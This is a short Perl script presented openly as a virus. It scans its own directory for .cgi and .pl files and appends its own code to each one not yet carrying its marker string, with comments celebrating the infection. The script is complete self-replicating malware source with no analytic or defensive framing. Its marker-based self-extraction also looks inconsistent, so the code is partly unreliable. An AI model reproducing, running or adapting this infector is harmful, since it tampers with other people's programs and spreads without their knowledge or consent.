#!/usr/bin/perl

	opendir(DIR, "."); #open the directory this program is in
	@FILES = readdir(DIR); #get the file names
	closedir(DIR);
	
	## Look for programs to spread to (limited to the current directory for now)
	for ($i = 0; $i < @FILES; $i++) {
		if (substr($FILES[$i], length($FILES[$i]) - 4) eq ".cgi" || substr($FILES[$i], length($FILES[$i]) - 3) eq ".pl") {
			$TARGETS[$ii] = $FILES[$i];
			$ii++;
		}
	}
	
	for ($i = 0; $i < @TARGETS; $i++) {
		open(FILE,$TARGETS[$i]);
		$file = join("",<FILE>);
		close(FILE);
		if (index($file, "## Perl Virus Begins Now ##") == -1) { ##the file isn't infected, INFECT IT!! (append to it)
			if ($me eq "") { #what we want to write hasn't been copied yet, this is a considerate virus, it could just keep copying itself each time and slow your computer down (and become a couple hundred bytes smaller)...
				open(me,$0); #opens THIS program
				$me = join("",<me>);
				$start = index($me,"## Perl Virus Begins Now ##");
				$me = substr($me, $start, rindex($me,"## Perl Virus Ends Now##") + 24 - $start);
				close(me);
			}
			open(FILE,">>$TARGETS[$i]");
			print FILE $me;
			close(FILE);
		}
	}
	closedir(DIR);
